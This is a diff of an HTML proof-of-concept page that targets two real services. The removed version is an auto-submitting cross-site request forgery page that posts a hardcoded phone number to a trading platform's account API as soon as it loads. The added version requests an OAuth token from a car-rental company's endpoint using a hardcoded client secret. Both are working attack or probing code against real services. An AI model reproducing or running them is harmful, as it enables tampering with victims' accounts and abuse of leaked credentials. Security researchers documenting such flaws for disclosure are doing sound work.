@@ -1,48 +1,55 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Submit Phone Number</title>
-  </head>
-  <body>
-    <form id="phoneForm">
-      <!-- Form fields are hidden since we're using JavaScript to submit the data -->
-      <input type="hidden" name="countryCode" value="+33" />
-      <input type="hidden" name="number" value="634866102" />
-      <input type="hidden" name="isPrimary" value="false" />
-      <input type="submit" value="Submit" />
-    </form>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fetch API POST Request</title>
+    <style>
+        #response-area {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+        }
+    </style>
+</head>
+<body>
+    <h1>Fetch API POST Request</h1>
+    <button id="fetch-btn">Fetch Data</button>
+    <div id="response-area">Response will be displayed here...</div>
 
     <script>
-      // Prevent the default form submission and send data using fetch with JSON content type
-      document.getElementById('phoneForm').onsubmit = function(event) {
-        event.preventDefault(); // Prevent normal form submission
+        document.getElementById('fetch-btn').addEventListener('click', fetchData);
 
-        // Prepare the data as a JavaScript object (which will be converted to JSON)
-        const data = {
-          countryCode: '+33',
-          number: '634866102',
-          isPrimary: false
-        };
+        function fetchData() {
+            const url = 'https://secure.europcar.com/auth/realms/ecom/protocol/openid-connect/token';
 
-        // Send the request using the fetch API with the appropriate headers
-        fetch('https://my.tickmill.com/api/client/phone-numbers', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json', // Correct content type
-            'Origin': 'https://ahmadzdddd.github.io', // Origin header
-          },
-          body: JSON.stringify(data) // Convert the JavaScript object to a JSON string
-        })
-        .then(response => response.json()) // Parse the JSON response
-        .then(data => console.log('Success:', data)) // Handle success
-        .catch(error => console.error('Error:', error)); // Handle error
-      };
+            // Form data to be sent in the body of the POST request
+            const formData = new URLSearchParams();
+            formData.append('client_id', 'onesite-guest');
+            formData.append('grant_type', 'client_credentials');
+            formData.append('client_secret', '3b2a7317-70c2-4d7a-b297-6cd73748d606');
 
-      // Automatically submit the form after the page loads
-      history.pushState('', '', '/');
-      document.getElementById('phoneForm').submit();
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded', // URL-encoded form data
+                },
+                body: formData.toString() // Convert the form data to a URL-encoded string
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json(); // Parse the JSON response
+            })
+            .then(data => {
+                document.getElementById('response-area').textContent = JSON.stringify(data, null, 2);
+            })
+            .catch(error => {
+                document.getElementById('response-area').textContent = 'Error: ' + error;
+            });
+        }
     </script>
-  </body>
+</body>
 </html>
